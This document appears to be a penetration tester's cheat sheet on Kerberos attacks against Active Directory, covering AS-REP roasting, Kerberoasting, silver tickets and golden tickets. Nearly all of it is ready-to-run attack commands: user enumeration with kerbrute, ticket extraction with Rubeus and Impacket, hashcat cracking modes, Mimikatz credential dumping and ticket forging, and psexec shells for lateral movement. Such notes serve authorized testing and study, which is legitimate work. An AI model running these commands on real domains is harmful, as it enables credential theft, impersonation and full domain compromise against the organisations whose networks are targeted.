# Kerberos Attacks

## Overview

Kerberos attacks target weaknesses in the Kerberos authentication protocol used by Active Directory. Common techniques involve abusing service tickets, account configurations, or delegated privileges to obtain credentials or impersonate other users. These attacks can enable privilege escalation, lateral movement, and, in some cases, complete domain compromise, making Kerberos security a critical area of focus during an assessment.

---
AS-REP ROASTING
---
If we have a list of valid users we can try and get hashes
[https://github.com/ropnop/kerbrute/releases/latest](https://github.com/ropnop/kerbrute/releases/latest)
```
kerbrute userenum [username file] --dc [target IP] -d [domain name]
```

AS-REP Roasting targets Kerberos accounts that do NOT require pre-authentication.

Enumerating vulnerable users with PowerView 
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Extracting Hashes
---

Windows ([https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus))
```
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Linux
```
Impacket-GetNPUsers <domain>/ -dc-ip <IP> -no-pass -usersfile valid_users.txt
```

Crack Hashes
---
Now we can crack with hashcat using the mode 18200
```
hashcat --help | grep -i "Kerberos"
```

Post-Exploit
---

Try password spraying
SMB/ WinRM Access
Lateral Movement
Kerberoasting 

Kerberoasting
---
Kerberoasting is an attack against Kerberos where we request service tickets (TGS) for accounts with SPNs and crack them offline to recover plaintext passwords.

Use when we have domain credentials  or we can enumerate SPN accounts

Identify Accounts
---
PowerView ([https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)) 
```
Get-DomainUser -SPN | select samaccountname,ServicePrincipalName
```
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Or we can also use Bloodhound

Extract Tickets
---
Linux
```
Impacket-GetUserSPNs -dc-ip <IP> INLANEFREIGHT.LOCAL/user -request
```
```
Impacket-GetUserSPNs -dc-ip <IP> INLANEFREIGHT.LOCAL/user -request-user sqldev
```

Windows
Rubeus ([https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus))
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
High-Value Targets
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Crack Hashes
---
Now we can crack with hashcat using the mode 13100
```
hashcat --help | grep -i "Kerberos"
```

Post-Exploitation
---

Privesc if the account is privileged
SMB/ WinRM

```
impacket-psexec -u [domain\user] -p [password] cmd.exe
```
```
runas /user:[hostname]\[username] cmd.exe
```
```
netexec smb [Target IP] -u user -p pass
```

Silver Ticket
---

We need the following three pieces of information to create a silver ticket:

-     SPN password hash
-     Domain SID
-     Target SPN

SPN password Hash
We can use Mimikatz to get the SPN password hash of the iis_service account. Starting PowerShell as Admin, launch mimikatz

```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```

Domain SID
```
whoami /user
```
- we do not need the RID (last part)

Target SPN
Using Mimikatz to forge the ticket
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Golden Ticket
---
We need to use mimikatz for this attack by targeting the krbtgt account

Start up
```
mimikatz.exe
```
```
privilege::debug
```
- If we do not get 'ok' for privilege debug we cannot use this 


```
lsadump::lsa /inject /name:krbtgt
```
- We need the SID of the domain
- NTLM hash
`
```
kerberos::golden /User:Administrator /domain:[domain name] /sid:[domain SID] /krbtgt:[NTLM hash] /id:500 /ptt
```

We should be able to open a shell
```
misc::cmd
```

We can run psexec on the new prompt and get a shell on any machine
```
impacket-psexec \\[machine name] cmd.exe
```
